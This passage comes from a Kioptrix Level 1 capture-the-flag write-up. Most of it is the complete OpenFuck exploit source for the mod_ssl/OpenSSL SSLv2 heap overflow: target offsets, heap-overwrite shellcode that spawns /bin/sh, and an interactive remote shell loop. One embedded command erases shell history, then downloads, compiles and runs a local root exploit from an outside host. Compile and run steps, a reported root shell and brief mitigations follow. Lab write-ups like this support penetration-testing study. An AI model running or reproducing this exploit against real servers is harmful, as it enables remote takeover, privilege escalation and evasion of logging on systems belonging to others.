	{       "RedHat Linux 8.0 (apache-2.0.40)",
                0x08092fa4
        },
	{
		"Slackware Linux 4.0 (apache-1.3.6)",
		0x08088130
	},
	{
		"Slackware Linux 7.0 (apache-1.3.9)",
		0x080a7fc0
	},
	{
		"Slackware Linux 7.0 (apache-1.3.26)",
		0x083d37fc
	},
        {       "Slackware 7.0  (apache-1.3.26)2",
		0x083d2232
	},
	{
		"Slackware Linux 7.1 (apache-1.3.12)",
		0x080a86a4
	},
	{
		"Slackware Linux 8.0 (apache-1.3.20)",
		0x080ae67c
	},
	{
		"Slackware Linux 8.1 (apache-1.3.24)",
		0x080b0c60
	},
	{
		"Slackware Linux 8.1 (apache-1.3.26)",
		0x080b2100
	},

	{
		"Slackware Linux 8.1-stable (apache-1.3.26)",
		0x080b0c60
	},
	{       "Slackware Linux (apache-1.3.27)",
	        0x080b1a3a
	},
	{
		"SuSE Linux 7.0 (apache-1.3.12)",
		0x0809f54c
	},
	{
		"SuSE Linux 7.1 (apache-1.3.17)",
		0x08099984
	},
	{
		"SuSE Linux 7.2 (apache-1.3.19)",
		0x08099ec8
	},
	{
		"SuSE Linux 7.3 (apache-1.3.20)",
		0x08099da8
	},
	{
		"SuSE Linux 8.0 (apache-1.3.23)",
		0x08086168
	},
	{
		"SUSE Linux 8.0 (apache-1.3.23-120)",
		0x080861c8
	},
	{
		"SuSE Linux 8.0 (apache-1.3.23-137)",
		0x080861c8
	},
/* this one unchecked cause require differend shellcode */
	{
		"Yellow Dog Linux/PPC 2.3 (apache-1.3.22-6.2.3a)",
		0xfd42630
	},

};

extern int errno;

int cipher;
int ciphers;

/* the offset of the local port from be beginning of the overwrite next chunk buffer */
#define FINDSCKPORTOFS     208 + 12 + 46

unsigned char overwrite_session_id_length[] =
	"AAAA"								/* int master key length; */
	"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"	/* unsigned char master key[SSL MAX MASTER KEY LENGTH];	*/
	"\x70\x00\x00\x00";					/* unsigned int session id length; */

unsigned char overwrite_next_chunk[] =
	"AAAA"								/* int master key length; */
	"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"	/* unsigned char master key[SSL MAX MASTER KEY LENGTH];	*/
	"AAAA"								/* unsigned int session id length; */
	"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"	/* unsigned char session id[SSL MAX SSL SESSION ID LENGTH]; */
	"AAAA"								/* unsigned int sid ctx length; */
	"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"	/* unsigned char sid ctx[SSL MAX SID CTX LENGTH]; */
	"AAAA"								/* int not resumable; */
	"\x00\x00\x00\x00"					/* struct sess cert st *sess cert; */
	"\x00\x00\x00\x00"					/* X509 *peer; */
	"AAAA"								/* long verify result; */
	"\x01\x00\x00\x00"					/* int references; */
	"AAAA"								/* int timeout; */
	"AAAA"								/* int time */
	"AAAA"								/* int compress meth; */
	"\x00\x00\x00\x00"					/* SSL CIPHER *cipher; */
	"AAAA"								/* unsigned long cipher id; */
	"\x00\x00\x00\x00"					/* STACK OF(SSL CIPHER) *ciphers; */
	"\x00\x00\x00\x00\x00\x00\x00\x00"	/* CRYPTO EX DATA ex data; */
	"AAAAAAAA"							/* struct ssl session st *prev,*next; */

	"\x00\x00\x00\x00"					/* Size of previous chunk */
	"\x11\x00\x00\x00"					/* Size of chunk, in bytes */
	"fdfd"								/* Forward and back pointers */
	"bkbk"
	"\x10\x00\x00\x00"					/* Size of previous chunk */
	"\x10\x00\x00\x00"					/* Size of chunk, PREV INUSE is set */

/* shellcode start */
    "\xeb\x0a\x90\x90"	/* jump 10 bytes ahead, land at shellcode */
    "\x90\x90\x90\x90"
    "\x90\x90\x90\x90"	/* this is overwritten with FD by the unlink macro */

/* 72 bytes findsckcode by LSD-pl */
    "\x31\xdb"             /* xorl    %ebx,%ebx              */
    "\x89\xe7"             /* movl    %esp,%edi              */
    "\x8d\x77\x10"         /* leal    0x10(%edi),%esi        */
    "\x89\x77\x04"         /* movl    %esi,0x4(%edi)         */
    "\x8d\x4f\x20"         /* leal    0x20(%edi),%ecx        */
    "\x89\x4f\x08"         /* movl    %ecx,0x8(%edi)         */
    "\xb3\x10"             /* movb    $0x10,%bl              */
    "\x89\x19"             /* movl    %ebx,(%ecx)            */
    "\x31\xc9"             /* xorl    %ecx,%ecx              */
    "\xb1\xff"             /* movb    $0xff,%cl              */
    "\x89\x0f"             /* movl    %ecx,(%edi)            */
    "\x51"                 /* pushl   %ecx                   */
    "\x31\xc0"             /* xorl    %eax,%eax              */
    "\xb0\x66"             /* movb    $0x66,%al              */
    "\xb3\x07"             /* movb    $0x07,%bl              */
    "\x89\xf9"             /* movl    %edi,%ecx              */
    "\xcd\x80"             /* int     $0x80                  */
    "\x59"                 /* popl    %ecx                   */
    "\x31\xdb"             /* xorl    %ebx,%ebx              */
    "\x39\xd8"             /* cmpl    %ebx,%eax              */
    "\x75\x0a"             /* jne     <findsckcode+54>       */
    "\x66\xb8\x12\x34"     /* movw    $0x1234,%bx            */
    "\x66\x39\x46\x02"     /* cmpw    %bx,0x2(%esi)          */
    "\x74\x02"             /* je      <findsckcode+56>       */
    "\xe2\xe0"             /* loop    <findsckcode+24>       */
    "\x89\xcb"             /* movl    %ecx,%ebx              */
    "\x31\xc9"             /* xorl    %ecx,%ecx              */
    "\xb1\x03"             /* movb    $0x03,%cl              */
    "\x31\xc0"             /* xorl    %eax,%eax              */
    "\xb0\x3f"             /* movb    $0x3f,%al              */
    "\x49"                 /* decl    %ecx                   */
    "\xcd\x80"             /* int     $0x80                  */
    "\x41"                 /* incl    %ecx                   */
    "\xe2\xf6"             /* loop    <findsckcode+62>       */

/* 10 byte setresuid(0,0,0); by core */
     "\x31\xc9"       /* xor    %ecx,%ecx */
     "\xf7\xe1"       /* mul    %ecx,%eax */
     "\x51"           /* push   %ecx */
     "\x5b"           /* pop    %ebx */
     "\xb0\xa4"       /* mov    $0xa4,%al */
     "\xcd\x80"       /* int    $0x80 */

    
/* bigger shellcode added by spabam */

/* "\xB8\x2F\x73\x68\x23\x25\x2F\x73\x68\xDC\x50\x68\x2F\x62\x69"
        "\x6E\x89\xE3\x31\xC0\x50\x53\x89\xE1\x04\x0B\x31\xD2\xCD\x80"
*/


/* 24 bytes execl("/bin/sh", "/bin/sh", 0); by LSD-pl */
    "\x31\xc0"             /* xorl    %eax,%eax              */
    "\x50"                 /* pushl   %eax                   */
    "\x68""//sh"           /* pushl   $0x68732f2f            */
    "\x68""/bin"           /* pushl   $0x6e69622f            */
    "\x89\xe3"             /* movl    %esp,%ebx              */
    "\x50"                 /* pushl   %eax                   */
    "\x53"                 /* pushl   %ebx                   */
    "\x89\xe1"             /* movl    %esp,%ecx              */
    "\x99"                 /* cdql                           */
    "\xb0\x0b"             /* movb    $0x0b,%al              */
    "\xcd\x80";             /* int     $0x80                  */

/* read and write buffer*/
#define BUFSIZE 16384

/* hardcoded protocol stuff */
#define CHALLENGE_LENGTH 16
#define RC4_KEY_LENGTH 16	/* 128 bits */
#define RC4_KEY_MATERIAL_LENGTH (RC4_KEY_LENGTH*2)

/* straight from the openssl source */
#define n2s(c,s)    ((s=(((unsigned int)(c[0]))<< 8)| (((unsigned int)(c[1]))    )),c+=2)
#define s2n(s,c)    ((c[0]=(unsigned char)(((s)>> 8)&0xff), c[1]=(unsigned char)(((s)    )&0xff)),c+=2)

/* we keep all SSL2 state in this structure */
typedef struct {
	int sock;

	/* client stuff */
	unsigned char challenge[CHALLENGE_LENGTH];
	unsigned char master_key[RC4_KEY_LENGTH];
	unsigned char key_material[RC4_KEY_MATERIAL_LENGTH];

	/* connection id - returned by the server */
	int conn_id_length;
	unsigned char conn_id[SSL2_MAX_CONNECTION_ID_LENGTH];

	/* server certificate */
	X509 *x509;

	/* session keys */
	unsigned char* read_key;
	unsigned char* write_key;
	RC4_KEY* rc4_read_key;
	RC4_KEY* rc4_write_key;

	/* sequence numbers, used for MAC calculation */
	int read_seq;
	int write_seq;

	/* set to 1 when the SSL2 handshake is complete */
	int encrypted;
} ssl_conn;

#define COMMAND1 "TERM=xterm; export TERM=xterm; exec bash -i\n"
// #define COMMAND2 "unset HISTFILE; cd /tmp; wget http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; \n"

#define COMMAND2 "unset HISTFILE; cd /tmp; wget https://pastebin.com/raw/C7v25Xr9 -O ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; \n"

long getip(char *hostname) {
	struct hostent *he;
	long ipaddr;
	
	if ((ipaddr = inet_addr(hostname)) < 0) {
		if ((he = gethostbyname(hostname)) == NULL) {
			perror("gethostbyname()");
			exit(-1);
		}
		memcpy(&ipaddr, he->h_addr, he->h_length);
	}	
	return ipaddr;
}

/* mixter's code w/enhancements by core */

int sh(int sockfd) {
   char snd[1024], rcv[1024];
   fd_set rset;
   int maxfd, n;

   /* Priming commands */
   strcpy(snd, COMMAND1 "\n");
   write(sockfd, snd, strlen(snd));

   strcpy(snd, COMMAND2 "\n");
   write(sockfd, snd, strlen(snd));

   /* Main command loop */
   for (;;) {
      FD_SET(fileno(stdin), &rset);
      FD_SET(sockfd, &rset);

      maxfd = ( ( fileno(stdin) > sockfd )?fileno(stdin):sockfd ) + 1;
      select(maxfd, &rset, NULL, NULL, NULL);

      if (FD_ISSET(fileno(stdin), &rset)) {
	 bzero(snd, sizeof(snd));
	 fgets(snd, sizeof(snd)-2, stdin);
	 write(sockfd, snd, strlen(snd));
      }

      if (FD_ISSET(sockfd, &rset)) {
	 bzero(rcv, sizeof(rcv));

	 if ((n = read(sockfd, rcv, sizeof(rcv))) == 0) {
	    printf("Good Bye!\n");
	    return 0;
	 }

	 if (n < 0) {
	    perror("read");
	    return 1;
	 }

	 fputs(rcv, stdout);
	 fflush(stdout); /* keeps output nice */
      }
   } /* for(;;) */
}

/* Returns the local port of a connected socket */
int get_local_port(int sock)
{
	struct sockaddr_in s_in;
	unsigned int namelen = sizeof(s_in);

	if (getsockname(sock, (struct sockaddr *)&s_in, &namelen) < 0) {
		printf("Can't get local port: %s\n", strerror(errno));
		exit(1);
	}

	return s_in.sin_port;
}

/* Connect to a host */
int connect_host(char* host, int port)
{
	struct sockaddr_in s_in;
	int sock;

	s_in.sin_family = AF_INET;
	s_in.sin_addr.s_addr = getip(host);
	s_in.sin_port = htons(port);

	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) <= 0) {
		printf("Could not create a socket\n");
		exit(1);
	}

	if (connect(sock, (struct sockaddr *)&s_in, sizeof(s_in)) < 0) {
		printf("Connection to %s:%d failed: %s\n", host, port, strerror(errno));
		exit(1);
	}

	return sock;
}

/* Create a new ssl conn structure and connect to a host */
ssl_conn* ssl_connect_host(char* host, int port)
{
	ssl_conn* ssl;

	if (!(ssl = (ssl_conn*) malloc(sizeof(ssl_conn)))) {
		printf("Can't allocate memory\n");
		exit(1);
	}

	/* Initialize some values */
	ssl->encrypted = 0;
	ssl->write_seq = 0;
	ssl->read_seq = 0;

	ssl->sock = connect_host(host, port);

	return ssl;
}

/* global buffer used by the ssl result() */
char res_buf[30];

/* converts an SSL error code to a string */
char* ssl_error(int code) {
	switch (code) {
		case 0x00:	return "SSL2 PE UNDEFINED ERROR (0x00)";
		case 0x01:	return "SSL2 PE NO CIPHER (0x01)";
		case 0x02:	return "SSL2 PE NO CERTIFICATE (0x02)";
		case 0x04:	return "SSL2 PE BAD CERTIFICATE (0x03)";
		case 0x06:	return "SSL2 PE UNSUPPORTED CERTIFICATE TYPE (0x06)";
	default:
		sprintf(res_buf, "%02x", code);
		return res_buf;
	}
}

/* read len bytes from a socket. boring. */
int read_data(int sock, unsigned char* buf, int len)
{
	int l;
	int to_read = len;

	do {
		if ((l = read(sock, buf, to_read)) < 0) {
			printf("Error in read: %s\n", strerror(errno));
			exit(1);
		}
		to_read -= len;
	} while (to_read > 0);

	return len;
}

/* reads an SSL packet and decrypts it if necessery */
int read_ssl_packet(ssl_conn* ssl, unsigned char* buf, int buf_size)
{
	int rec_len, padding;

	read_data(ssl->sock, buf, 2);

	if ((buf[0] & 0x80) == 0) {
		/* three byte header */
		rec_len = ((buf[0] & 0x3f) << 8) | buf[1];
		read_data(ssl->sock, &buf[2], 1);
		padding = (int)buf[2];
	}
	else {
		/* two byte header */
		rec_len = ((buf[0] & 0x7f) << 8) | buf[1];
		padding = 0;
	}

	if ((rec_len <= 0) || (rec_len > buf_size)) {
		printf("read_ssl_packet: Record length out of range (rec_len = %d)\n", rec_len); 
		exit(1);
	}

	read_data(ssl->sock, buf, rec_len);

	if (ssl->encrypted) {
		if (MD5_DIGEST_LENGTH + padding >= rec_len) {
			if ((buf[0] == SSL2_MT_ERROR) && (rec_len == 3)) {
				/* the server didn't switch to encryption due to an error */
				return 0;
			}
			else {
				printf("read_ssl_packet: Encrypted message is too short (rec_len = %d)\n", rec_len);
				exit(1);
			}
		}

		/* decrypt the encrypted part of the packet */
		RC4(ssl->rc4_read_key, rec_len, buf, buf);

		/* move the decrypted message in the beginning of the buffer */
		rec_len = rec_len - MD5_DIGEST_LENGTH - padding;
		memmove(buf, buf + MD5_DIGEST_LENGTH, rec_len);
	}

	if (buf[0] == SSL2_MT_ERROR) {
		if (rec_len != 3) {
			printf("Malformed server error message\n");
			exit(1);
		}
		else {
			return 0;
		}
	}

	return rec_len;
}

/* send an ssl packet, encrypting it if ssl->encrypted is set */
void send_ssl_packet(ssl_conn* ssl, unsigned char* rec, int rec_len)
{
	unsigned char buf[BUFSIZE];
	unsigned char* p;
	int tot_len;
	MD5_CTX ctx;
	int seq;


	if (ssl->encrypted)
		tot_len = rec_len + MD5_DIGEST_LENGTH;	/* RC4 needs no padding */
	else
		tot_len = rec_len;

	if (2 + tot_len > BUFSIZE) {
		printf("send_ssl_packet: Record length out of range (rec_len = %d)\n", rec_len);
		exit(1);
	}

	p = buf;
	s2n(tot_len, p);

	buf[0] = buf[0] | 0x80;	/* two byte header */

	if (ssl->encrypted) {
		/* calculate the MAC */
		seq = ntohl(ssl->write_seq);

		MD5_Init(&ctx);
		MD5_Update(&ctx, ssl->write_key, RC4_KEY_LENGTH);
		MD5_Update(&ctx, rec, rec_len);
		MD5_Update(&ctx, &seq, 4);
		MD5_Final(p, &ctx);

		p+=MD5_DIGEST_LENGTH;

		memcpy(p, rec, rec_len);

		/* encrypt the payload */
		RC4(ssl->rc4_write_key, tot_len, &buf[2], &buf[2]);

	}
	else {
		memcpy(p, rec, rec_len);
	}

	send(ssl->sock, buf, 2 + tot_len, 0);

	/* the sequence number is incremented by both encrypted and plaintext packets
*/
	ssl->write_seq++;
}

/* Send a CLIENT HELLO message to the server */
void send_client_hello(ssl_conn *ssl)
{
	int i;
	unsigned char buf[BUFSIZE] =
		"\x01"			/* client hello msg */

		"\x00\x02"		/* client version */
		"\x00\x18"		/* cipher specs length */
		"\x00\x00"		/* session id length */
		"\x00\x10"		/* challenge length */

		"\x07\x00\xc0\x05\x00\x80\x03\x00"	/* cipher specs data */
		"\x80\x01\x00\x80\x08\x00\x80\x06"
		"\x00\x40\x04\x00\x80\x02\x00\x80"

		"";									/* session id data */

	/* generate CHALLENGE LENGTH bytes of challenge data */
	for (i = 0; i < CHALLENGE_LENGTH; i++) {
		ssl->challenge[i] = (unsigned char) (rand() >> 24);
	}
	memcpy(&buf[33], ssl->challenge, CHALLENGE_LENGTH);

	send_ssl_packet(ssl, buf, 33 + CHALLENGE_LENGTH);
}

/* Get a SERVER HELLO response from the server */
void get_server_hello(ssl_conn* ssl)
{
	unsigned char buf[BUFSIZE];
	//unsigned char *p, *end;
	const unsigned char *p, *end;
	int len;
	int server_version, cert_length, cs_length, conn_id_length;
	int found;

	if (!(len = read_ssl_packet(ssl, buf, sizeof(buf)))) {
		printf("Server error: %s\n", ssl_error(ntohs(*(uint16_t*)&buf[1])));
		exit(1);
	}
	if (len < 11) {
		printf("get_server_hello: Packet too short (len = %d)\n", len);
		exit(1);
	}

	p = buf;

	if (*(p++) != SSL2_MT_SERVER_HELLO) {
		printf("get_server_hello: Expected SSL2 MT SERVER HELLO, got %x\n", (int)p[-1]);
		exit(1);
	}

	if (*(p++) != 0) {
		printf("get_server_hello: SESSION-ID-HIT is not 0\n");
		exit(1);
	}

	if (*(p++) != 1) {
		printf("get_server_hello: CERTIFICATE-TYPE is not SSL CT X509 CERTIFICATE\n");
		exit(1);
	}

	n2s(p, server_version);
	if (server_version != 2) {
		printf("get_server_hello: Unsupported server version %d\n", server_version);
		exit(1);
	}

	n2s(p, cert_length);
	n2s(p, cs_length);
	n2s(p, conn_id_length);

	if (len != 11 + cert_length + cs_length + conn_id_length) {
		printf("get_server_hello: Malformed packet size\n");
		exit(1);
	}

	/* read the server certificate */
	ssl->x509 = NULL;
	ssl->x509=d2i_X509(NULL,&p,(long)cert_length);
	if (ssl->x509 == NULL) {
		printf("get server hello: Cannot parse x509 certificate\n");
		exit(1);
	}

	if (cs_length % 3 != 0) {
		printf("get server hello: CIPHER-SPECS-LENGTH is not a multiple of 3\n");
		exit(1);
	}

	found = 0;
	for (end=p+cs_length; p < end; p += 3) {
		if ((p[0] == 0x01) && (p[1] == 0x00) && (p[2] == 0x80))
			found = 1;	/* SSL CK RC4 128 WITH MD5 */
	}

	if (!found) {
		printf("get server hello: Remote server does not support 128 bit RC4\n");
		exit(1);
	}

	if (conn_id_length > SSL2_MAX_CONNECTION_ID_LENGTH) {
		printf("get server hello: CONNECTION-ID-LENGTH is too long\n");
		exit(1);
	}

	/* The connection id is sent back to the server in the CLIENT FINISHED packet */
	ssl->conn_id_length = conn_id_length;
	memcpy(ssl->conn_id, p, conn_id_length);
}

/* Send a CLIENT MASTER KEY message to the server */

void send_client_master_key(ssl_conn* ssl, unsigned char* key_arg_overwrite, int key_arg_overwrite_len) {
	int encrypted_key_length, key_arg_length, record_length;
	unsigned char* p;
	int i;
	EVP_PKEY *pkey=NULL;

	unsigned char buf[BUFSIZE] =
		"\x02"			/* client master key message */
		"\x01\x00\x80"	/* cipher kind */
		"\x00\x00"		/* clear key length */
		"\x00\x40"		/* encrypted key length */
		"\x00\x08";		/* key arg length */

	p = &buf[10];

	/* generate a 128 byte master key */
	for (i = 0; i < RC4_KEY_LENGTH; i++) {
		ssl->master_key[i] = (unsigned char) (rand() >> 24);
	}

	pkey=X509_get_pubkey(ssl->x509);
	if (!pkey) {
		printf("send client master key: No public key in the server certificate\n");
		exit(1);
	}

	//if (pkey->type != EVP_PKEY_RSA) {
	if (EVP_PKEY_get1_RSA(pkey) == NULL) {
		printf("send client master key: The public key in the server certificate is not a RSA key\n");
		exit(1);
	}

	/* Encrypt the client master key with the server public key and put it in the packet */
	//encrypted_key_length = RSA_public_encrypt(RC4_KEY_LENGTH, ssl->master_key, &buf[10], pkey->pkey.rsa, RSA_PKCS1_PADDING);
	encrypted_key_length = RSA_public_encrypt(RC4_KEY_LENGTH, ssl->master_key, &buf[10], EVP_PKEY_get1_RSA(pkey), RSA_PKCS1_PADDING);
	if (encrypted_key_length <= 0) {
		printf("send client master key: RSA encryption failure\n");
		exit(1);
	}

	p += encrypted_key_length;

	if (key_arg_overwrite) {
		/* These 8 bytes fill the key arg array on the server */
		for (i = 0; i < 8; i++) {
			*(p++) = (unsigned char) (rand() >> 24);
		}
		/* This overwrites the data following the key arg array */
		memcpy(p, key_arg_overwrite, key_arg_overwrite_len);

		key_arg_length = 8 + key_arg_overwrite_len;
	}
	else {
		key_arg_length = 0;	/* RC4 doesn't use KEY-ARG */
	}
	p = &buf[6];
	s2n(encrypted_key_length, p);
	s2n(key_arg_length, p);
	record_length = 10 + encrypted_key_length + key_arg_length;
	send_ssl_packet(ssl, buf, record_length);
	ssl->encrypted = 1;
}
void generate_key_material(ssl_conn* ssl)
{
	unsigned int i;
	MD5_CTX ctx;
	unsigned char *km;
	unsigned char c='0';

	km=ssl->key_material;
	for (i=0; i<RC4_KEY_MATERIAL_LENGTH; i+=MD5_DIGEST_LENGTH) {
		MD5_Init(&ctx);

		MD5_Update(&ctx,ssl->master_key,RC4_KEY_LENGTH);
		MD5_Update(&ctx,&c,1);
		c++;
		MD5_Update(&ctx,ssl->challenge,CHALLENGE_LENGTH);
		MD5_Update(&ctx,ssl->conn_id, ssl->conn_id_length);
		MD5_Final(km,&ctx);
		km+=MD5_DIGEST_LENGTH;
	}
}
void generate_session_keys(ssl_conn* ssl)
{
	generate_key_material(ssl);
	ssl->read_key = &(ssl->key_material[0]);
	ssl->rc4_read_key = (RC4_KEY*) malloc(sizeof(RC4_KEY));
	RC4_set_key(ssl->rc4_read_key, RC4_KEY_LENGTH, ssl->read_key);

	ssl->write_key = &(ssl->key_material[RC4_KEY_LENGTH]);
	ssl->rc4_write_key = (RC4_KEY*) malloc(sizeof(RC4_KEY));
	RC4_set_key(ssl->rc4_write_key, RC4_KEY_LENGTH, ssl->write_key);
}
void get_server_verify(ssl_conn* ssl)
{
	unsigned char buf[BUFSIZE];
	int len;
	if (!(len = read_ssl_packet(ssl, buf, sizeof(buf)))) {
		printf("Server error: %s\n", ssl_error(ntohs(*(uint16_t*)&buf[1])));
		exit(1);
	}
	if (len != 1 + CHALLENGE_LENGTH) {
		printf("get server verify: Malformed packet size\n");
		exit(1);
	}
	if (buf[0] != SSL2_MT_SERVER_VERIFY) {
		printf("get server verify: Expected SSL2 MT SERVER VERIFY, got %x\n", (int)buf[0]);
		exit(1);
	}
	if (memcmp(ssl->challenge, &buf[1], CHALLENGE_LENGTH)) {
		printf("get server verify: Challenge strings don't match\n");
		exit(1);
	}
}
void send_client_finished(ssl_conn* ssl)
{
	unsigned char buf[BUFSIZE];
	buf[0] = SSL2_MT_CLIENT_FINISHED;
	memcpy(&buf[1], ssl->conn_id, ssl->conn_id_length);
	send_ssl_packet(ssl, buf, 1+ssl->conn_id_length);
}
void get_server_finished(ssl_conn* ssl)
{
	unsigned char buf[BUFSIZE];
	int len;
	int i;
	if (!(len = read_ssl_packet(ssl, buf, sizeof(buf)))) {
		printf("Server error: %s\n", ssl_error(ntohs(*(uint16_t*)&buf[1])));
		exit(1);
	}
	if (buf[0] != SSL2_MT_SERVER_FINISHED) {
		printf("get server finished: Expected SSL2 MT SERVER FINISHED, got %x\n", (int)buf[0]);
		exit(1);
	}

	if (len <= 112 /*17*/) {
		printf("This server is not vulnerable to this attack.\n");
		exit(1);
	}
	cipher = *(int*)&buf[101];
	ciphers = *(int*)&buf[109];
	printf("cipher: 0x%x   ciphers: 0x%x\n", cipher, ciphers);
}
void get_server_error(ssl_conn* ssl)
{
	unsigned char buf[BUFSIZE];
	int len;

	if ((len = read_ssl_packet(ssl, buf, sizeof(buf))) > 0) {
		printf("get server finished: Expected SSL2 MT ERROR, got %x\n", (int)buf[0]);
		exit(1);
	}
}
void usage(char* argv0)
{
	int i;
	printf(": Usage: %s target box [port] [-c N]\n\n", argv0);
	printf("  target - supported box eg: 0x00\n");
	printf("  box - hostname or IP address\n");
	printf("  port - port for ssl connection\n");
	printf("  -c open N connections. (use range 40-50 if u dont know)\n");
	printf("  \n\n");
	printf("  Supported OffSet:\n");

	for (i=0; i<=MAX_ARCH; i++) {
		printf("\t0x%02x - %s\n", i, architectures[i].desc);
	}
	printf("\nFuck to all guys who like use lamah ddos. Read SRC to have no surprise\n");

	exit(1);
}
int main(int argc, char* argv[])
{
	char* host;
	int port = 443;
	int i;
	int arch;
	int N = 0;
	ssl_conn* ssl1;
	ssl_conn* ssl2;

	printf("\n");
	printf("*******************************************************************\n");
	printf("* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *\n");
	printf("*******************************************************************\n");
        printf("* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *\n");
        printf("* #hackarena  irc.brasnet.org                                     *\n");
	printf("* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *\n");
	printf("* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *\n");
	printf("* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *\n");
	printf("*******************************************************************\n");
	printf("\n");
	if ((argc < 3) || (argc > 6))
		usage(argv[0]);
	sscanf(argv[1], "0x%x", &arch);
	if ((arch < 0) || (arch > MAX_ARCH))
		usage(argv[0]);
	host = argv[2];
	if (argc == 4)
		port = atoi(argv[3]);
	else if (argc == 5) {
		if (strcmp(argv[3], "-c"))
			usage(argv[0]);
		N = atoi(argv[4]);
	}
	else if (argc == 6) {
		port = atoi(argv[3]);
		if (strcmp(argv[4], "-c"))
			usage(argv[0]);
		N = atoi(argv[5]);
	}
	srand(0x31337);
	for (i=0; i<N; i++) {
		printf("\rConnection... %d of %d", i+1, N);
		fflush(stdout);
		connect_host(host, port);
		usleep(100000);
	}
	if (N) printf("\n");
	printf("Establishing SSL connection\n");
	ssl1 = ssl_connect_host(host, port);
	ssl2 = ssl_connect_host(host, port);
	send_client_hello(ssl1);
	get_server_hello(ssl1);
	send_client_master_key(ssl1, overwrite_session_id_length, sizeof(overwrite_session_id_length)-1);
	generate_session_keys(ssl1);
	get_server_verify(ssl1);
	send_client_finished(ssl1);
	get_server_finished(ssl1);
	printf("Ready to send shellcode\n");
	port = get_local_port(ssl2->sock);
	overwrite_next_chunk[FINDSCKPORTOFS] = (char) (port & 0xff);
	overwrite_next_chunk[FINDSCKPORTOFS+1] = (char) ((port >> 8) & 0xff);
	*(int*)&overwrite_next_chunk[156] = cipher;
	*(int*)&overwrite_next_chunk[192] = architectures[arch].func_addr - 12;
	*(int*)&overwrite_next_chunk[196] = ciphers + 16;	/* shellcode address */
	send_client_hello(ssl2);
	get_server_hello(ssl2);
	send_client_master_key(ssl2, overwrite_next_chunk, sizeof(overwrite_next_chunk)-1);
	generate_session_keys(ssl2);
	get_server_verify(ssl2);
	for (i = 0; i < ssl2->conn_id_length; i++) {
		ssl2->conn_id[i] = (unsigned char) (rand() >> 24);
	}
	send_client_finished(ssl2);
	get_server_error(ssl2);
	printf("Spawning shell...\n");
	sleep(1);
	sh(ssl2->sock);
	close(ssl2->sock);
	close(ssl1->sock);
	return 0;
}
/* spabam: It isn't 0day */

// milw0rm.com [2003-04-04]

```

1. install libssl-dev: `apt install libssl-dev`
2. you must compile it: `gcc -o OpenFuck OpenFuck.c -lcrypto`
3. run the exploit: `./OpenFuck 0x6b 192.168.1.9 443 -c 50` the `0x6b` for the apache version `Red Hat Linux, using apache version 1.3.20`

![[kioptrix level 1 rooted via modssl openfuck.png]]

luckily we got a root shell successfully

### 4. Summary And Chain Of Vuln That We Used
1. **Samba trans2open Buffer Overflow (CVE-2003-0201)**:
    
    - **Mitigation**: Update Samba to a patched version or disable unused services.
        
2. **mod_ssl OpenSSL Buffer Overflow (CVE-2002-0082)**:
    
    - **Mitigation**: Upgrade OpenSSL and mod_ssl to versions without known vulnerabilities.
